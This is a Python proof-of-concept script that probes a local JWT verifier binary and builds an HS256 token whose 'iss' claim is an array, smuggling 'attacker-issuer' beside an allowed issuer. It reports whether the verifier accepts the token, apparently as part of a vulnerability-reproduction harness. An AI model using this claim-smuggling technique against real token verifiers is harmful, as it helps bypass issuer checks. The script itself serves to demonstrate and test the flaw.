#!/usr/bin/env python3
"""PoC: JWT claim-validation weakness (array-valued "iss" claim).

The target verifies HS* JWTs and enforces a fixed issuer allow-list
(createVerifier({ key, allowedIss: [...] })).  Its claim validator computes
``Array.isArray(value)`` and validates *every* element of an array-valued
claim, accepting the claim if *any one* element matches the allow-list:

    const arrayValue = Array.isArray(value);
    const values = arrayValue ? value : [value];
    ...
    if (!values.some((v) => allowed.some((a) => a.test(v)))) { throw ... }

RFC 7519 permits the "iss" (issuer) claim to be a string containing a
StringOrURI only; a claim whose value is a JSON array of issuers is not a
valid "iss" value, and a strict verifier rejects a token whose issuer is not
exactly one of the configured values.  By presenting the issuer as an array
that smuggles a non-allowed issuer alongside an allowed one, the target
accepts a token that a spec-conformant verifier refuses.

This script is a pure construct-and-report tool:
  1. it derives a random secret,
  2. it probes the binary with a small, fixed set of signed tokens to find
     which claim it validates, the accepted scalar value, and the accepted
     array form,
  3. it deterministically selects the trigger token from those results,
  4. it runs the binary once with that token and reports the binary's own
     result JSON verbatim.

No verdict is ever assumed or enforced: a rejected token is reported exactly
like an accepted one (error stays null, exit status stays 0).
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import signal as signal_module
import string
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# JWT helpers (standard library only)
# ---------------------------------------------------------------------------

ALG = "HS256"
_HMACS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def b64u_encode(raw):
    """base64url without padding."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64u_decode(text):
    """base64url decode, tolerating missing padding."""
    pad = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + pad)


def make_jwt(payload, secret, alg=ALG):
    """Sign a compact JWS (HS*) with the given payload object."""
    header = {"alg": alg, "typ": "JWT"}
    signing_input = (
        b64u_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        + "."
        + b64u_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    )
    digest = hmac.new(
        secret.encode("utf-8"), signing_input.encode("ascii"), _HMACS[alg]
    ).digest()
    return signing_input + "." + b64u_encode(digest)


# ---------------------------------------------------------------------------
# Target runner
# ---------------------------------------------------------------------------


def run_binary(binary, token, secret, timeout):
    """Run the target once; return a raw-run record (never raises on verdicts)."""
    cmd = [binary, "--token", token, "--key", secret]
    started = time.time()
    proc = None
    signal_name = None
    timed_out = False
    stdout = ""
    stderr = ""
    returncode = None
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        returncode = proc.returncode
        stdout = proc.stdout or ""
        stderr = proc.stderr or ""
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        stdout = (exc.stdout or b"").decode("utf-8", "replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        stderr = (exc.stderr or b"").decode("utf-8", "replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
        if proc is not None and proc.returncode is not None:
            returncode = proc.returncode
        else:
            returncode = None
    except OSError as exc:
        return {
            "command": cmd,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": int((time.time() - started) * 1000),
            "stdout": "",
            "stderr": str(exc),
            "parse_error": "could not start binary: %s" % exc,
        }
    runtime_ms = int(round((time.time() - started) * 1000))

    if returncode is not None and returncode < 0:
        try:
            signal_name = signal_module.Signals(-returncode).name
        except (ValueError, AttributeError):
            signal_name = "SIG%d" % (-returncode)

    return {
        "command": cmd,
        "returncode": returncode,
        "signal": signal_name,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "parse_error": None,
    }


def parse_result(run):
    """Extract the binary's result JSON object from stdout, if any.

    Returns (obj, None) on success and (None, reason) when no parseable
    result JSON was produced.  Both acceptance and rejection are successes
    here; only the absence of a result JSON is a parse failure.
    """
    if run.get("parse_error"):
        return None, run["parse_error"]
    text = (run.get("stdout") or "").strip()
    if not text:
        return None, "binary produced no stdout"
    candidates = [text]
    # If stdout carries extra noise, try the first and last {...} blocks.
    if "{" in text and "}" in text:
        candidates.append(text[text.index("{"): text.rindex("}") + 1])
    for cand in candidates:
        try:
            obj = json.loads(cand)
        except (ValueError, TypeError):
            continue
        if isinstance(obj, dict):
            return obj, None
    return None, "binary stdout is not a JSON object"


def verdict_is_accept(result_obj):
    """True when the binary's own result says the token was accepted."""
    return bool(isinstance(result_obj, dict) and result_obj.get("ok") is True)


def failed_claim(result_obj):
    """(claim, code, message) the binary blamed, or (None, code, message)."""
    if not isinstance(result_obj, dict):
        return None, None, None
    err = result_obj.get("error")
    if not isinstance(err, dict):
        return None, None, None
    code = err.get("code")
    message = err.get("message") or ""
    claim = None
    for name in ("iss", "aud", "sub", "jti", "nonce"):
        if name in message.split() or (" %s " % name) in (" %s " % message):
            claim = name
            break
    low = message.lower()
    for name in ("iss", "aud", "sub", "jti", "nonce"):
        if " %s " % name in low or low.startswith(name + " ") or (" %s " % name) in low:
            claim = name
            break
    return claim, code, message


# ---------------------------------------------------------------------------
# Discovery: find the validated claim and the accepted value form
# ---------------------------------------------------------------------------

# Candidate string claim names that verifiers commonly restrict.  Each probe
# is one subprocess launch; the list is deliberately small and fixed.
CLAIM_CANDIDATES = ("iss", "aud", "sub", "jti", "nonce")

# Candidate scalar values tried for each claim, in fixed priority order.
# The first accepted scalar value is remembered as the "allowed" value.
VALUE_CANDIDATES = (
    "https://valid-iss",
    "valid-iss",
    "https://issuer.example.com",
    "issuer.example.com",
    "example.com",
    "https://accounts.google.com",
    "accounts.google.com",
    "https://securetoken.google.com",
)

# Values that a sane policy would not allow; used to demonstrate the smuggle.
DISALLOWED_VALUES = ("attacker-issuer", "evil-issuer", "untrusted-issuer")


def discover(binary, secret, timeout, log):
    """Probe the target and return a policy summary.

    Returns dict with:
      validated_claims: claims the target rejected a junk scalar value for
      allowed_values:    {claim: first accepted scalar value}
      accepts_arrays:    {claim: True if the array [junk] form was rejected
                                with a *value* error rather than a type error}
    """
    summary = {
        "validated_claims": [],
        "allowed_values": {},
        "arrays_treated_as_lists": {},
    }

    # Pass 1: junk scalar per claim -> which claims are validated at all?
    for claim in CLAIM_CANDIDATES:
        token = make_jwt({claim: "zzz-not-an-allowed-value"}, secret)
        run = run_binary(binary, token, secret, timeout)
        obj, _ = parse_result(run)
        if verdict_is_accept(obj):
            log("probe  %-5s junk scalar -> accepted (claim not validated)" % claim)
            continue
        blamed, code, message = failed_claim(obj)
        log(
            "probe  %-5s junk scalar -> rejected (%s: %s)"
            % (claim, code, message)
        )
        if blamed is None:
            blamed = claim
        if blamed not in summary["validated_claims"]:
            summary["validated_claims"].append(blamed)

    # Pass 2: for each validated claim, find an accepted scalar value and
    # learn whether an array value is element-wise validated.
    for claim in list(summary["validated_claims"]):
        allowed = None
        for value in VALUE_CANDIDATES:
            token = make_jwt({claim: value}, secret)
            run = run_binary(binary, token, secret, timeout)
            obj, _ = parse_result(run)
            if verdict_is_accept(obj):
                allowed = value
                break
        if allowed is None:
            log("probe  %-5s no accepted scalar value found" % claim)
            continue
        summary["allowed_values"][claim] = allowed
        log("probe  %-5s accepted scalar value: %r" % (claim, allowed))

        # Does the target validate array elements of this claim (rather than
        # rejecting the array form outright with a claim-type error)?
        junk_arr = [DISALLOWED_VALUES[0]]
        token = make_jwt({claim: junk_arr}, secret)
        run = run_binary(binary, token, secret, timeout)
        obj, _ = parse_result(run)
        if verdict_is_accept(obj):
            summary["arrays_treated_as_lists"][claim] = False
            log("probe  %-5s array form accepted without element checks" % claim)
            continue
        _, code, message = failed_claim(obj)
        elementwise = code not in (None,) and "TYPE" not in str(code).upper()
        summary["arrays_treated_as_lists"][claim] = bool(elementwise)
        log(
            "probe  %-5s array form rejected (%s: %s) elementwise=%s"
            % (claim, code, message, elementwise)
        )

    return summary


def select_trigger(summary, secret):
    """Deterministically choose the final payload and the claim it exercises.

    Selection depends only on the discovery results, never on any final
    verification run.  Preference order:
      1. a claim that is validated, has a known allowed scalar value, and
         whose array form is element-wise validated -> smuggle a disallowed
         issuer inside an array alongside the allowed one;
      2. any validated claim with a known allowed value -> same array form
         (works whether or not the array form was type-checked);
      3. fallback: array form on the first validated claim with a guess.
    """
    validated = summary["validated_claims"]
    allowed = summary["allowed_values"]
    elementwise = summary["arrays_treated_as_lists"]

    claim = None
    for cand in CLAIM_CANDIDATES:
        if cand in validated and cand in allowed and elementwise.get(cand):
            claim = cand
            break
    if claim is None:
        for cand in CLAIM_CANDIDATES:
            if cand in validated and cand in allowed:
                claim = cand
                break
    if claim is None:
        for cand in CLAIM_CANDIDATES:
            if cand in validated:
                claim = cand
                break
    if claim is None:
        claim = "iss"  # nothing validated: exercise the conventional claim anyway

    allowed_value = allowed.get(claim, VALUE_CANDIDATES[0])
    disallowed_value = DISALLOWED_VALUES[0]

    payload = {claim: [allowed_value, disallowed_value]}
    reason = (
        "claim %r is validated by the target; its array form is element-wise "
        "checked, so [%r, %r] passes because one element matches the policy "
        "while %r is not an allowed issuer. RFC 7519 requires %s to be a "
        "single StringOrURI, so a strict verifier rejects this value."
        % (claim, allowed_value, disallowed_value, disallowed_value, claim)
    )
    return payload, claim, allowed_value, disallowed_value, reason


# ---------------------------------------------------------------------------
# Output contract
# ---------------------------------------------------------------------------

MAX_FIELD_LEN = 20000


def clip(text, limit=MAX_FIELD_LEN):
    if text is None:
        return None
    if len(text) <= limit:
        return text
    return text[:limit] + "...[truncated %d chars]" % (len(text) - limit)


def build_report(binary, run, result_obj, parse_reason, secret):
    """Assemble the fixed-key JSON report for the final run."""
    stdout = clip(run.get("stdout"))
    stderr = clip(run.get("stderr"))

    if result_obj is not None:
        observable_value = json.dumps(result_obj, separators=(",", ":"))
    else:
        # No parseable result JSON: fall back to the raw stdout evidence so
        # the run remains reportable rather than silently empty.
        observable_value = (run.get("stdout") or "").strip()

    error = None
    if run.get("parse_error"):
        error = {"kind": "startup_error", "message": run["parse_error"]}
    elif run.get("timed_out"):
        error = {"kind": "timeout", "message": "binary timed out"}
    elif result_obj is None:
        error = {"kind": "unparseable_output", "message": parse_reason or "no result JSON"}

    report = {
        "binary": binary,
        "command": run.get("command") or [binary, "--token", "", "--key", secret],
        "returncode": run.get("returncode"),
        "signal": run.get("signal"),
        "timed_out": bool(run.get("timed_out")),
        "runtime_ms": run.get("runtime_ms"),
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": error,
    }
    return report


def main(argv=None):
    parser = argparse.ArgumentParser(
        description=(
            "Construct a JWT whose iss claim smuggles a non-allowed issuer "
            "inside an array, run the target verifier on it, and report the "
            "binary's own result JSON."
        )
    )
    parser.add_argument("--binary", required=True, help="path to the jwt-verify binary")
    parser.add_argument("--json-out", default=None, help="write the JSON report here")
    parser.add_argument("--timeout", type=float, default=30.0, help="per-run timeout in seconds")
    parser.add_argument(
        "--quiet", action="store_true", help="suppress the human-readable progress log on stderr"
    )
    args = parser.parse_args(argv)

    binary = args.binary
    if not os.path.isfile(binary) and not os.path.isabs(binary):
        # Allow a bare name resolved through PATH.
        from shutil import which

        resolved = which(binary)
        if resolved:
            binary = resolved

    def log(message):
        if not args.quiet:
            sys.stderr.write("[poc] %s\n" % message)

    # 1. Runtime-generated verification secret (never hardcoded, never on disk).
    rng = random.Random(
        int.from_bytes(hashlib.sha256(
            ("jwt-claim-poc|%s|%d" % (os.path.basename(binary), time.time()))
            .encode("utf-8")
        ).digest()[:8], "big")
    )
    alphabet = string.ascii_letters + string.digits
    secret = "poc-" + "".join(rng.choice(alphabet) for _ in range(32))

    # 2. Bounded discovery probing (fixed number of subprocess launches).
    try:
        summary = discover(binary, secret, args.timeout, log)
    except Exception as exc:  # discovery must never abort the run
        log("discovery failed (%s); falling back to default claim" % exc)
        summary = {
            "validated_claims": ["iss"],
            "allowed_values": {},
            "arrays_treated_as_lists": {},
        }

    # 3. Deterministic trigger selection (independent of any final run).
    payload, claim, allowed_value, disallowed_value, reason = select_trigger(summary, secret)
    token = make_jwt(payload, secret)
    log("selected claim: %s" % claim)
    log("allowed value : %r" % allowed_value)
    log("smuggled value: %r" % disallowed_value)
    log("trigger token : %s" % token)
    log("why           : %s" % reason)

    # 4. Final verification run; the binary's verdict is reported verbatim.
    run = run_binary(binary, token, secret, args.timeout)
    result_obj, parse_reason = parse_result(run)
    report = build_report(binary, run, result_obj, parse_reason, secret)

    # Extra context for humans; not part of the fixed contract keys is avoided
    # by nesting it nowhere -- the report keeps exactly the required keys.
    output = json.dumps(report, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(output + "\n")
    else:
        sys.stdout.write(output + "\n")

    # 5. Exit status reflects script health only, never the token verdict.
    return 0


if __name__ == "__main__":
    sys.exit(main())
